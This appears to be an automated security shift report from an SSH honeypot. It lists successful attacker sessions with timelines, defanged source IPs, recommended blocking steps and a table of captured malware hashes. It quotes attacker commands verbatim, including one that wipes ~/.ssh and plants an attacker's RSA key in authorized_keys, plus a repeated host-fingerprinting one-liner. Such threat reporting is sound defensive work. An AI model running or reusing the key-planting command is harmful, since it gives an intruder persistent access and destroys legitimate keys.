| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:44:36` | `cowrie.session.connect` |
| `2026-07-02 16:44:36` | `cowrie.client.version` |
| `2026-07-02 16:44:36` | `cowrie.client.kex` |
| `2026-07-02 16:44:36` | `cowrie.login.success` |
| `2026-07-02 16:44:37` | `cowrie.session.params` |
| `2026-07-02 16:44:37` | `cowrie.command.input` |
| `2026-07-02 16:44:37` | `cowrie.command.failed` |
| `2026-07-02 16:44:37` | `cowrie.log.closed` |
| `2026-07-02 16:44:38` | `cowrie.session.params` |
| `2026-07-02 16:44:38` | `cowrie.command.input` |
| `2026-07-02 16:44:38` | `cowrie.session.file_download` |
| `2026-07-02 16:44:38` | `cowrie.log.closed` |
| `2026-07-02 16:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]49` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45cdb2619b9b

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]49` |
| **First Seen** | 2026-07-02 16:44 |
| **Last Seen** | 2026-07-02 16:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:44:38` | `cowrie.session.connect` |
| `2026-07-02 16:44:38` | `cowrie.client.version` |
| `2026-07-02 16:44:38` | `cowrie.client.kex` |
| `2026-07-02 16:44:39` | `cowrie.login.success` |
| `2026-07-02 16:44:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]49` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063ff9bccac5

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]49` |
| **First Seen** | 2026-07-02 16:44 |
| **Last Seen** | 2026-07-02 16:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:44:39` | `cowrie.session.connect` |
| `2026-07-02 16:44:39` | `cowrie.client.version` |
| `2026-07-02 16:44:39` | `cowrie.client.kex` |
| `2026-07-02 16:44:40` | `cowrie.login.success` |
| `2026-07-02 16:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]49` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf027cc70d8b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 16:47 |
| **Last Seen** | 2026-07-02 16:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:47:38` | `cowrie.session.connect` |
| `2026-07-02 16:47:38` | `cowrie.client.version` |
| `2026-07-02 16:47:38` | `cowrie.client.kex` |
| `2026-07-02 16:47:40` | `cowrie.login.success` |
| `2026-07-02 16:47:42` | `cowrie.session.params` |
| `2026-07-02 16:47:42` | `cowrie.command.input` |
| `2026-07-02 16:47:42` | `cowrie.command.input` |
| `2026-07-02 16:47:42` | `cowrie.command.input` |
| `2026-07-02 16:47:42` | `cowrie.command.input` |
| `2026-07-02 16:47:42` | `cowrie.command.input` |
| `2026-07-02 16:47:42` | `cowrie.command.success` |
| `2026-07-02 16:47:42` | `cowrie.command.input` |
| `2026-07-02 16:47:42` | `cowrie.command.input` |
| `2026-07-02 16:47:42` | `cowrie.command.input` |
| `2026-07-02 16:47:42` | `cowrie.command.input` |
| `2026-07-02 16:47:43` | `cowrie.log.closed` |
| `2026-07-02 16:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2af6f7b124f6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 16:49 |
| **Last Seen** | 2026-07-02 16:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:49:22` | `cowrie.session.connect` |
| `2026-07-02 16:49:23` | `cowrie.client.version` |
| `2026-07-02 16:49:23` | `cowrie.client.kex` |
| `2026-07-02 16:49:24` | `cowrie.login.success` |
| `2026-07-02 16:49:26` | `cowrie.session.params` |
| `2026-07-02 16:49:26` | `cowrie.command.input` |
| `2026-07-02 16:49:26` | `cowrie.command.input` |
| `2026-07-02 16:49:26` | `cowrie.command.input` |
| `2026-07-02 16:49:26` | `cowrie.command.input` |
| `2026-07-02 16:49:26` | `cowrie.command.input` |
| `2026-07-02 16:49:26` | `cowrie.command.success` |
| `2026-07-02 16:49:26` | `cowrie.command.input` |
| `2026-07-02 16:49:26` | `cowrie.command.input` |
| `2026-07-02 16:49:26` | `cowrie.command.input` |
| `2026-07-02 16:49:26` | `cowrie.command.input` |
| `2026-07-02 16:49:26` | `cowrie.log.closed` |
| `2026-07-02 16:49:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f64369461c42

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 16:49 |
| **Last Seen** | 2026-07-02 16:50 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:49:53` | `cowrie.session.connect` |
| `2026-07-02 16:49:54` | `cowrie.client.version` |
| `2026-07-02 16:49:54` | `cowrie.client.kex` |
| `2026-07-02 16:50:00` | `cowrie.login.success` |
| `2026-07-02 16:50:04` | `cowrie.session.params` |
| `2026-07-02 16:50:04` | `cowrie.command.input` |
| `2026-07-02 16:50:06` | `cowrie.log.closed` |
| `2026-07-02 16:50:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d14a4f9408

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 16:51 |
| **Last Seen** | 2026-07-02 16:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:51:06` | `cowrie.session.connect` |
| `2026-07-02 16:51:06` | `cowrie.client.version` |
| `2026-07-02 16:51:06` | `cowrie.client.kex` |
| `2026-07-02 16:51:08` | `cowrie.login.success` |
| `2026-07-02 16:51:09` | `cowrie.session.params` |
| `2026-07-02 16:51:09` | `cowrie.command.input` |
| `2026-07-02 16:51:09` | `cowrie.command.input` |
| `2026-07-02 16:51:09` | `cowrie.command.input` |
| `2026-07-02 16:51:09` | `cowrie.command.input` |
| `2026-07-02 16:51:09` | `cowrie.command.input` |
| `2026-07-02 16:51:09` | `cowrie.command.success` |
| `2026-07-02 16:51:09` | `cowrie.command.input` |
| `2026-07-02 16:51:09` | `cowrie.command.input` |
| `2026-07-02 16:51:09` | `cowrie.command.input` |
| `2026-07-02 16:51:09` | `cowrie.command.input` |
| `2026-07-02 16:51:10` | `cowrie.log.closed` |
| `2026-07-02 16:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c97b4b20278

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 16:52 |
| **Last Seen** | 2026-07-02 16:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:52:49` | `cowrie.session.connect` |
| `2026-07-02 16:52:51` | `cowrie.client.version` |
| `2026-07-02 16:52:51` | `cowrie.client.kex` |
| `2026-07-02 16:52:53` | `cowrie.login.success` |
| `2026-07-02 16:52:55` | `cowrie.session.params` |
| `2026-07-02 16:52:55` | `cowrie.command.input` |
| `2026-07-02 16:52:55` | `cowrie.command.input` |
| `2026-07-02 16:52:55` | `cowrie.command.input` |
| `2026-07-02 16:52:55` | `cowrie.command.input` |
| `2026-07-02 16:52:55` | `cowrie.command.input` |
| `2026-07-02 16:52:55` | `cowrie.command.success` |
| `2026-07-02 16:52:55` | `cowrie.command.input` |
| `2026-07-02 16:52:55` | `cowrie.command.input` |
| `2026-07-02 16:52:55` | `cowrie.command.input` |
| `2026-07-02 16:52:55` | `cowrie.command.input` |
| `2026-07-02 16:52:55` | `cowrie.log.closed` |
| `2026-07-02 16:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a21fa992ca

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-02 16:54 |
| **Last Seen** | 2026-07-02 16:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:54:34` | `cowrie.session.connect` |
| `2026-07-02 16:54:34` | `cowrie.client.version` |
| `2026-07-02 16:54:34` | `cowrie.client.kex` |
| `2026-07-02 16:54:35` | `cowrie.login.success` |
| `2026-07-02 16:54:37` | `cowrie.session.params` |
| `2026-07-02 16:54:37` | `cowrie.command.input` |
| `2026-07-02 16:54:37` | `cowrie.command.input` |
| `2026-07-02 16:54:37` | `cowrie.command.input` |
| `2026-07-02 16:54:37` | `cowrie.command.input` |
| `2026-07-02 16:54:37` | `cowrie.command.input` |
| `2026-07-02 16:54:37` | `cowrie.command.success` |
| `2026-07-02 16:54:37` | `cowrie.command.input` |
| `2026-07-02 16:54:37` | `cowrie.command.input` |
| `2026-07-02 16:54:37` | `cowrie.command.input` |
| `2026-07-02 16:54:37` | `cowrie.command.input` |
| `2026-07-02 16:54:37` | `cowrie.log.closed` |
| `2026-07-02 16:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **11** | 2026-07-02 12:55 | 2026-07-02 16:49 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `117.72.209[.]56` | **10** | 2026-07-02 14:06 | 2026-07-02 14:31 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `101.132.182[.]180` | **2** | 2026-07-02 13:41 | 2026-07-02 13:43 | 4m | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | **2** | 2026-07-02 14:10 | 2026-07-02 15:14 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-07-02 13:15 | 2026-07-02 13:15 | 10s | 0 | `T1592` | 🟢 LOW |
| `124.226.212[.]169` | 1 | 2026-07-02 15:01 | 2026-07-02 15:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]206` | 1 | 2026-07-02 16:01 | 2026-07-02 16:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `141.11.88[.]122` | 1 | 2026-07-02 15:37 | 2026-07-02 15:37 | 30s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-02 15:24 | 2026-07-02 15:25 | 70s | 0 | `T1592` | 🟢 LOW |
| `160.119.71[.]92` | 1 | 2026-07-02 14:52 | 2026-07-02 14:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.184.84[.]77` | 1 | 2026-07-02 15:29 | 2026-07-02 15:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.42.93[.]139` | 1 | 2026-07-02 16:18 | 2026-07-02 16:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]116` | 1 | 2026-07-02 15:02 | 2026-07-02 15:02 | 2s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | 1 | 2026-07-02 14:27 | 2026-07-02 14:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `223.83.114[.]88` | 1 | 2026-07-02 16:13 | 2026-07-02 16:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `23.17.35[.]68` | 1 | 2026-07-02 14:34 | 2026-07-02 14:34 | 31s | 0 | `T1592` | 🟢 LOW |
| `39.130.240[.]179` | 1 | 2026-07-02 14:39 | 2026-07-02 14:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.130.240[.]253` | 1 | 2026-07-02 15:39 | 2026-07-02 15:41 | 103s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-07-02 13:03 | 2026-07-02 13:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-07-02 13:33 | 2026-07-02 13:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-07-02 14:33 | 2026-07-02 14:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-07-02 13:33 | 2026-07-02 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-07-02 14:33 | 2026-07-02 14:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]142` | 1 | 2026-07-02 14:24 | 2026-07-02 14:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-07-02 15:32 | 2026-07-02 15:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | 1 | 2026-07-02 14:38 | 2026-07-02 14:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | 1 | 2026-07-02 16:39 | 2026-07-02 16:39 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
